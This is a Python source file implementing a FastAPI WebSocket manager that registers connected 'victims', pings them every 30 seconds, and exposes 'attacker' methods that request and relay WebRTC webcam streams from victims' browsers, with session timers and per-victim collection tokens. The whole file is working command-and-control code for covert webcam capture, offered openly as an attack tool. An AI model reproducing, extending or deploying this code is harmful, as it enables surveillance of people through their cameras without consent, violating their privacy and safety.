# core/websocket_manager.py

from __future__ import annotations

from datetime import datetime
from fastapi import WebSocket
from typing import Dict, List, Literal, Optional
import asyncio
from dataclasses import dataclass
import logging
import hmac
import secrets

logger = logging.getLogger(__name__)

@dataclass
class WebRTCSignal:
    """WebRTC signaling data"""
    type: str  # 'offer' | 'answer' | 'candidate'
    victim_id: str
    session_id: str
    data: dict
    timestamp: datetime

class WebSocketManager:
    def __init__(
        self,
        max_pending_candidates: int = 64,
        webcam_max_duration_seconds: float = 10 * 60,
    ):
        if min(max_pending_candidates, webcam_max_duration_seconds) <= 0:
            raise ValueError("WebSocket manager limits must be positive")
        self.max_pending_candidates = max_pending_candidates
        self.webcam_max_duration_seconds = webcam_max_duration_seconds
        self.victims: Dict[str, WebSocket] = {}
        self._lock = asyncio.Lock()

        # WebRTC signaling storage
        self.webrtc_offers: Dict[str, WebRTCSignal] = {}  # {victim_id: offer}
        self.pending_candidates: Dict[str, List[dict]] = {}  # {victim_id: [candidates]}
        self.received_candidate_counts: Dict[str, int] = {}
        self.sent_candidate_counts: Dict[str, int] = {}
        self.active_webcam_sessions: Dict[str, str] = {}
        self.webcam_errors: Dict[str, str] = {}
        self._webcam_expiry_tasks: Dict[str, asyncio.Task] = {}
        self.collection_tokens: Dict[str, str] = {}

        # Background ping task
        self._ping_task: Optional[asyncio.Task] = None

    @property
    def ping_loop_running(self) -> bool:
        """Return whether the background connection check is active."""
        return self._ping_task is not None and not self._ping_task.done()

    # ===== BACKGROUND PING TASK =====

    async def start_ping_loop(self):
        """Start background ping task for all victims every 30s"""
        if self._ping_task is not None:
            logger.warning("⚠️ Ping loop already running")
            return

        self._ping_task = asyncio.create_task(self._ping_loop())
        logger.info("✅ Ping loop started")

    async def stop_ping_loop(self):
        """Stop background ping task gracefully"""
        if self._ping_task:
            self._ping_task.cancel()
            try:
                await self._ping_task
            except asyncio.CancelledError:
                pass
            self._ping_task = None
            logger.info("✅ Ping loop stopped gracefully")

    async def _ping_loop(self):
        """Background task that pings all victims every 30s"""
        while True:
            try:
                await asyncio.sleep(30)  # Ping ogni 30 secondi

                victim_ids = self.get_active_victims()

                if victim_ids:
                    logger.debug(f"🔔 Pinging {len(victim_ids)} victims...")

                    # Ping all active victim connections concurrently.
                    tasks = [self.ping_victim(vid) for vid in victim_ids]
                    results = await asyncio.gather(*tasks, return_exceptions=True)

                    failed = sum(1 for r in results if isinstance(r, Exception) or r is False)
                    if failed > 0:
                        logger.warning(f"⚠️ {failed}/{len(victim_ids)} pings failed")

            except asyncio.CancelledError:
                logger.info("🛑 Ping loop cancelled")
                break
            except Exception as e:
                logger.error(f"❌ Error in ping loop: {e}")
                await asyncio.sleep(5)

    # ===== VICTIM METHODS (Public WS) =====

    async def ping_victim(self, victim_id: str) -> bool:
        """Ping victim to check if connection is alive"""
        websocket = self.victims.get(victim_id)
        if not websocket:
            return False

        try:
            await websocket.send_text("ping")
            logger.debug(f"🔔 Ping sent to {victim_id}")
            return True
        except Exception as e:
            logger.warning(f"⚠️ Ping failed for victim {victim_id}: {e}")
            await self.disconnect_victim(victim_id, websocket)
            return False

    async def connect_victim(self, victim_id: str, websocket: WebSocket):
        """Register victim WebSocket connection"""
        async with self._lock:
            self._clear_webcam_state_locked(victim_id)
            self.victims[victim_id] = websocket
            self.collection_tokens[victim_id] = secrets.token_urlsafe(32)
            logger.info(f"✅ Victim {victim_id} connected (total: {len(self.victims)})")

    async def disconnect_victim(
        self,
        victim_id: str,
        websocket: WebSocket | None = None,
    ) -> bool:
        """Remove a victim only when the caller still owns its connection."""
        async with self._lock:
            current = self.victims.get(victim_id)
            if websocket is not None and current is not websocket:
                return False

            self.victims.pop(victim_id, None)
            self.collection_tokens.pop(victim_id, None)
            self._clear_webcam_state_locked(victim_id)

            logger.info(f"❌ Victim {victim_id} disconnected (total: {len(self.victims)})")
            return current is not None

    async def is_current_victim(
        self,
        victim_id: str,
        websocket: WebSocket,
    ) -> bool:
        async with self._lock:
            return self.victims.get(victim_id) is websocket

    async def handle_victim_webrtc_message(
        self,
        victim_id: str,
        message: dict,
    ) -> Literal["accepted", "stale", "limit"]:
        """Store an already validated WebRTC message within fixed bounds."""
        msg_type = message.get('type')
        session_id = message.get("session_id")

        async with self._lock:
            if victim_id not in self.victims:
                return "stale"
            if self.active_webcam_sessions.get(victim_id) != session_id:
                logger.warning(
                    "Ignored stale webcam signaling for victim %s",
                    victim_id,
                )
                return "stale"

            if msg_type == 'webrtc-offer':
                existing_offer = self.webrtc_offers.get(victim_id)
                if existing_offer and existing_offer.session_id == session_id:
                    logger.warning(
                        "Ignored duplicate WebRTC offer from victim %s",
                        victim_id,
                    )
                    return "stale"
                self.webrtc_offers[victim_id] = WebRTCSignal(
                    type='offer',
                    victim_id=victim_id,
                    session_id=session_id,
                    data=message['offer'],
                    timestamp=datetime.now()
                )
                logger.info(f"📦 Stored WebRTC offer from victim {victim_id}")
                return "accepted"

            if msg_type == 'webrtc-candidate':
                candidates = self.pending_candidates.setdefault(victim_id, [])
                received_count = self.received_candidate_counts.get(
                    victim_id,
                    0,
                )
                if (
                    received_count >= self.max_pending_candidates
                    or len(candidates) >= self.max_pending_candidates
                ):
                    logger.warning(
                        "Rejected excess ICE candidate from victim %s",
                        victim_id,
                    )
                    return "limit"
                self.received_candidate_counts[victim_id] = received_count + 1
                candidates.append({
                    'candidate': message['candidate'],
                    'session_id': session_id,
                    'timestamp': datetime.now().isoformat()
                })
                logger.debug("Stored ICE candidate from victim %s", victim_id)
                return "accepted"

            if msg_type == "webcam-error":
                self.webcam_errors[victim_id] = message["code"]
                logger.warning(
                    "Webcam capture failed for victim %s (%s)",
                    victim_id,
                    message["code"],
                )
                return "accepted"

        return "stale"

    def _clear_webcam_state_locked(self, victim_id: str) -> None:
        self.webrtc_offers.pop(victim_id, None)
        self.pending_candidates.pop(victim_id, None)
        self.received_candidate_counts.pop(victim_id, None)
        self.sent_candidate_counts.pop(victim_id, None)
        self.active_webcam_sessions.pop(victim_id, None)
        self.webcam_errors.pop(victim_id, None)
        expiry_task = self._webcam_expiry_tasks.pop(victim_id, None)
        if expiry_task and expiry_task is not asyncio.current_task():
            expiry_task.cancel()

    async def _expire_webcam_session(
        self,
        victim_id: str,
        session_id: str,
    ) -> None:
        try:
            await asyncio.sleep(self.webcam_max_duration_seconds)
            logger.info("Webcam session expired for victim %s", victim_id)
            await self.stop_webcam_session(victim_id, session_id)
        except asyncio.CancelledError:
            pass

    async def send_to_victim(self, victim_id: str, message: str) -> bool:
        """Send message to specific victim"""
        websocket = self.victims.get(victim_id)
        if not websocket:
            return False

        try:
            await websocket.send_text(message)
            return True
        except Exception as e:
            logger.error(f"Error sending to victim {victim_id}: {e}")
            await self.disconnect_victim(victim_id, websocket)
            return False

    async def send_json_to_victim(self, victim_id: str, data: dict) -> bool:
        """Send JSON to specific victim"""
        websocket = self.victims.get(victim_id)
        if not websocket:
            return False

        try:
            await websocket.send_json(data)
            return True
        except Exception as e:
            logger.error(f"Error sending JSON to victim {victim_id}: {e}")
            await self.disconnect_victim(victim_id, websocket)
            return False

    # ===== ATTACKER METHODS (Private API) =====

    async def request_webcam_offer(
        self,
        victim_id: str,
        session_id: str,
        timeout: int = 5,
    ) -> Optional[dict]:
        """Request webcam offer from victim"""
        if victim_id not in self.victims:
            logger.warning(f"⚠️ Victim {victim_id} not connected")
            return None

        async with self._lock:
            self._clear_webcam_state_locked(victim_id)
            self.active_webcam_sessions[victim_id] = session_id
            self._webcam_expiry_tasks[victim_id] = asyncio.create_task(
                self._expire_webcam_session(victim_id, session_id)
            )

        success = await self.send_json_to_victim(victim_id, {
            'type': 'request-webcam',
            'victim_id': victim_id,
            'session_id': session_id,
        })

        if not success:
            await self.stop_webcam_session(
                victim_id,
                session_id,
                notify_victim=False,
            )
            return None

        logger.info(f"📤 Sent webcam request to victim {victim_id}, waiting for offer...")

        for _ in range(timeout * 10):
            await asyncio.sleep(0.1)

            async with self._lock:
                if self.active_webcam_sessions.get(victim_id) != session_id:
                    return None
                error_code = self.webcam_errors.get(victim_id)
                offer = self.webrtc_offers.get(victim_id)

            if error_code:
                await self.stop_webcam_session(victim_id, session_id)
                return {
                    "session_id": session_id,
                    "error": error_code,
                }

            if offer and offer.session_id == session_id:
                logger.info(f"✅ Received offer from victim {victim_id}")
                return {
                    'offer': offer.data,
                    'timestamp': offer.timestamp.isoformat(),
                    'session_id': session_id,
                }

        logger.warning(f"⏱️ Timeout waiting for offer from victim {victim_id} after {timeout}s")
        await self.stop_webcam_session(victim_id, session_id)
        return None

    async def send_webcam_answer(
        self,
        victim_id: str,
        session_id: str,
        answer: dict,
    ) -> bool:
        """Send WebRTC answer to victim"""
        async with self._lock:
            if self.active_webcam_sessions.get(victim_id) != session_id:
                return False
        success = await self.send_json_to_victim(victim_id, {
            'type': 'webrtc-answer',
            'victim_id': victim_id,
            'session_id': session_id,
            'answer': answer,
        })

        if success:
            logger.info(f"📥 Sent WebRTC answer to victim {victim_id}")

        return success

    async def send_ice_candidate_to_victim(
        self,
        victim_id: str,
        session_id: str,
        candidate: dict,
    ) -> Literal["accepted", "stale", "limit"]:
        """Send ICE candidate to victim"""
        async with self._lock:
            if self.active_webcam_sessions.get(victim_id) != session_id:
                return "stale"
            sent_count = self.sent_candidate_counts.get(victim_id, 0)
            if sent_count >= self.max_pending_candidates:
                return "limit"
            self.sent_candidate_counts[victim_id] = sent_count + 1
        success = await self.send_json_to_victim(victim_id, {
            'type': 'webrtc-candidate',
            'victim_id': victim_id,
            'session_id': session_id,
            'candidate': candidate,
        })

        if success:
            logger.info(f"🧊 Sent ICE candidate to victim {victim_id}")

        return "accepted" if success else "stale"

    async def get_victim_ice_candidates(
        self,
        victim_id: str,
        session_id: str,
    ) -> Optional[List[dict]]:
        """Get pending ICE candidates from victim"""
        async with self._lock:
            if self.active_webcam_sessions.get(victim_id) != session_id:
                return None
            candidates = self.pending_candidates.pop(victim_id, [])

        if candidates:
            logger.info(f"📋 Retrieved {len(candidates)} ICE candidates for victim {victim_id}")

        return candidates

    async def stop_webcam_session(
        self,
        victim_id: str,
        session_id: str,
        *,
        notify_victim: bool = True,
    ) -> bool:
        """Stop one active webcam session and discard its signaling state."""
        async with self._lock:
            active_session_id = self.active_webcam_sessions.get(victim_id)
            if active_session_id is None:
                return False
            if session_id != active_session_id:
                return False
            self._clear_webcam_state_locked(victim_id)

        if notify_victim:
            await self.send_json_to_victim(
                victim_id,
                {
                    "type": "webcam-stop",
                    "victim_id": victim_id,
                    "session_id": active_session_id,
                },
            )
        logger.info("Webcam session stopped for victim %s", victim_id)
        return True

    def get_webcam_session_id(self, victim_id: str) -> str | None:
        return self.active_webcam_sessions.get(victim_id)

    # ===== UTILITY METHODS =====

    def get_active_victims(self) -> List[str]:
        """Get list of active victim IDs"""
        return list(self.victims.keys())

    def is_victim_connected(self, victim_id: str) -> bool:
        """Check if victim is connected"""
        return victim_id in self.victims

    def get_collection_token(self, victim_id: str) -> Optional[str]:
        return self.collection_tokens.get(victim_id)

    def verify_collection_token(self, victim_id: str, token: str | None) -> bool:
        expected = self.collection_tokens.get(victim_id)
        return bool(
            expected
            and token
            and hmac.compare_digest(expected, token)
            and victim_id in self.victims
        )

    def get_stats(self) -> dict:
        """Get manager statistics"""
        return {
            "active_victims": len(self.victims),
            "total_connections": len(self.victims),
            "webrtc_offers": len(self.webrtc_offers),
            "pending_candidates": sum(len(c) for c in self.pending_candidates.values()),
            "active_webcam_sessions": len(self.active_webcam_sessions),
        }


# Singleton instance
ws_manager = WebSocketManager()
